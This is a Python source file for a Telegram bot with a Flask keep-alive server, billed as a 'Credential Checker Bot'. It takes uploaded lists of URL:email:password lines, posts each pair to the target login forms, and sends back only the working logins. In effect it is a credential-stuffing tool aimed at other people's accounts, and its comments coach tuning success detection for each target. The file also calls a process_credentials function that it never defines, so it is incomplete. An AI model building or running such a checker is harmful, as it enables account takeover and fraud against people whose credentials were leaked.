import os
import sys
import logging
import threading
import aiohttp
import asyncio

# Fix for Pyrogram on Python 3.14+
try:
    asyncio.get_event_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

from flask import Flask
from pyrogram import Client, filters, enums
from pyrogram.types import Message, InputMediaDocument
from config import API_ID, API_HASH, BOT_TOKEN, ADMINS

# --- Configuration ---
# ADMINS is a string of comma-separated user IDs in config.py
ALLOWED_USERS = []
if ADMINS:
    ALLOWED_USERS = [int(id.strip()) for id in ADMINS.split(',') if id.strip().isdigit()]

# Logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)

# --- Security Middleware ---
def is_admin(user_id):
    if not ALLOWED_USERS:
        return False # If no admins defined, deny all (safety first)
    return user_id in ALLOWED_USERS

# --- Flask Health Server (Keep Alive) ---
flask_app = Flask(__name__)

@flask_app.route("/")
def health_check():
    return "Bot is running and healthy.", 200

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    logger.info(f"Starting Flask health server on port {port}")
    flask_app.run(host="0.0.0.0", port=port, use_reloader=False, threaded=True)

# --- Credential Checking Logic ---
import aiohttp
import logging
import json

# Configure a specific logger for this module
logger = logging.getLogger(__name__)

async def check_credential(session, url, username, password):
    """
    Attempts to validate credentials against the target URL.
    Returns:
        True  -> If explicit success criteria are met.
        False -> If login fails, server error, redirect, or timeout.
    
    NOTE: This function logs detailed diagnostic info to 'debug_log.txt' 
    to help identify the correct success indicator. It does NOT log passwords.
    """
    
    # Safe logging of the target (no credentials)
    target_info = f"Target: {url}"
    
    try:
        # Prepare the payload. 
        # NOTE: You must ensure these field names ('username', 'password') match what the target expects.
        # Common variations: 'email', 'user', 'login', 'pass', 'pwd'. Check the target's login form.
        payload = {
            'username': username,
            'password': password
        }
        
        # CRITICAL: allow_redirects=False. 
        # Many services redirect to a login page on failure (302) or to a dashboard on success (302).
        # We must handle the redirect manually or treat it as a failure if we can't verify the destination.
        async with session.post(
            url, 
            data=payload, 
            allow_redirects=False, 
            timeout=10  # Strict timeout to prevent hanging
        ) as response:
            
            status = response.status
            headers = dict(response.headers)
            content_type = headers.get('Content-Type', '')
            
            # Read the response body
            try:
                text = await response.text()
            except Exception:
                text = ""
            
            # --- DIAGNOSTIC LOGGING (SAFE) ---
            # Log the raw response to a file for analysis. 
            # This helps us see exactly what a "failure" or "success" looks like from the server.
            debug_entry = f"""
--- DIAGNOSTIC START ---
URL: {url}
Status: {status}
Content-Type: {content_type}
Redirect Location: {headers.get('Location', 'None')}
Response Length: {len(text)}
Response Snippet (first 500 chars):
{text[:500]}
--- DIAGNOSTIC END ---
"""
            with open("debug_log.txt", "a", encoding="utf-8") as f:
                f.write(debug_entry)
            
            # --- LOGIC: HANDLE ERRORS & REDIRECTS ---
            
            # 1. Network/Server Errors (5xx)
            if 500 <= status < 600:
                logger.warning(f"{target_info} | Server Error: {status}. Skipping.")
                return False
            
            # 2. Authentication Errors (401, 403)
            if status in [401, 403]:
                # Explicit failure
                return False
            
            # 3. Redirects (3xx)
            if 300 <= status < 400:
                # A redirect usually means:
                # - Failure: Redirect to login page with error message.
                # - Success: Redirect to dashboard/home.
                # Without verifying the destination (which requires following the redirect), we treat this as a failure 
                # OR we need to check the 'Location' header. 
                # For safety and simplicity in a checker, unless we know the exact success redirect URL, we return False.
                logger.warning(f"{target_info} | Redirect Detected ({status}). Location: {headers.get('Location', 'Unknown')}. This usually indicates a failure or requires complex handling. Treating as Invalid.")
                return False

            # 4. Success Case (200 OK)
            if status == 200:
                # NOW we check the content. 
                # WE DO NOT GUESS. We rely on the IS_VALID_RESPONSE function.
                if is_valid_response(text, content_type, url):
                    logger.info(f"{target_info} | VALID Credential Found.")
                    return True
                else:
                    # The server returned 200 OK, but the content indicates failure (e.g., "Invalid password" message on a 200 page).
                    # This is common in poorly designed APIs or HTML forms.
                    logger.info(f"{target_info} | HTTP 200 received, but content indicates failure. Check debug_log.txt.")
                    return False
            
            # Fallback for any other status
            logger.warning(f"{target_info} | Unexpected status {status}. Treating as Invalid.")
            return False

    except asyncio.TimeoutError:
        logger.warning(f"{target_info} | Timeout. Skipping.")
        return False
    except aiohttp.ClientError as e:
        logger.warning(f"{target_info} | Connection Error: {str(e)}. Skipping.")
        return False
    except Exception as e:
        logger.error(f"{target_info} | Unexpected Error: {str(e)}. Skipping.")
        return False

def is_valid_response(text, content_type, url):
    """
    Determines if the response indicates a successful login.
    THIS IS THE CRITICAL FUNCTION YOU MUST CUSTOMIZE.
    
    Current Logic:
    - If JSON: Checks for specific success keys (YOU MUST PROVID THESE).
    - If HTML: Checks for specific success text (YOU MUST PROVID THIS).
    
    If you don't know the success criteria, this function returns False by default.
    Check 'debug_log.txt' to see what the server actually sends.
    """
    
    # 1. Handle JSON Responses
    if 'application/json' in content_type:
        try:
            data = json.loads(text)
            
            # --- CUSTOMIZE THIS SECTION ---
            # Example: If success looks like {"status": "success", "token": "abc123"}
            # You must replace this with your actual API's success condition.
            
            # Placeholder: Check for common success patterns (LIKELY INCORRECT FOR YOUR TARGET)
            # If your target returns a token on success:
            if 'token' in data or 'access_token' in data or 'session_id' in data:
                return True
            # If your target returns a specific status field:
            if data.get('status') == 'success' or data.get('result') == 'success':
                return True
            # If your target returns user data:
            if 'user_id' in data and 'username' in data:
                return True
            
            # If none of the above match, it's not a valid response based on known patterns.
            return False
            # --- END CUSTOMIZE SECTION ---
            
        except json.JSONDecodeError:
            logger.warning(f"Expected JSON from {url} but parsing failed. Content: {text[:100]}")
            return False

    # 2. Handle HTML/Text Responses
    else:
        # --- CUSTOMIZE THIS SECTION ---
        # If your target returns HTML, you MUST find a unique string that ONLY appears on a successful login.
        # E.g., "Welcome, User", "Account Dashboard", "Logout", or a specific HTML ID like 'id="user-profile"'.
        # DO NOT use generic words like "welcome", "home", "login", "success" as they appear on error pages too.
        
        # Example (LIKELY INCORRECT):
        # if "Welcome" in text and "Dashboard" in text:
        #     return True
        
        # Since we don't know your target's success marker, we return False.
        # Check debug_log.txt to see the response, find a unique string, and add it here.
        logger.warning(f"HTML response received for {url}. No success marker configured. Check debug_log.txt.")
        return False
        # --- END CUSTOMIZE SECTION ---

    return False

# --- Bot Handlers ---
app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@app.on_message(filters.command("start"))
async def start_handler(client, message: Message):
    if not is_admin(message.from_user.id):
        return

    await message.reply_text(
        "👨‍💻 **Credential Checker Bot**\n\n"
        "I can validate credentials from a text file.\n\n"
        "**Format:**\n"
        "URL:email:password or URL:username:password\n\n"
        "**How to use:**\n"
        "1. Send a `.txt` file with your list.\n"
        "2. I will check each line and return a new file with ONLY valid credentials.\n\n"
        "⚠️ **Note:**\n"
        "- Progress updates are sent every 10%.\n"
        "- Do not send multiple files at once."
    )

@app.on_message(filters.document)
async def handle_document(client, message: Message):
    if not is_admin(message.from_user.id):
        return # Silent ignore for non-admins
    
    file_name = message.document.file_name
    if not file_name.endswith('.txt'):
        await message.reply_text("❌ Invalid file type. Please send a `.txt` file only.")
        return
    
    try:
        file_path = await message.download()
    except Exception as e:
        await message.reply_text(f"❌ Failed to download file: {str(e)}")
        return
    
    await message.reply_text("📥 File received. Starting validation process...")
    
    # Start processing in a separate task
    asyncio.create_task(process_credentials(client, message, file_path))

@app.on_message(filters.private)
async def private_handler(client, message: Message):
    if not is_admin(message.from_user.id):
        return # Silent ignore
    await message.reply_text("⚠️ **Access Denied**. Only authorized administrators can use this bot.")

# --- Main Execution ---
if __name__ == "__main__":
    # Start Flask in a separate daemon thread
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    logger.info("Flask health server started.")
    logger.info("Starting Pyrogram Client...")
    
    # Run the bot
    app.run()
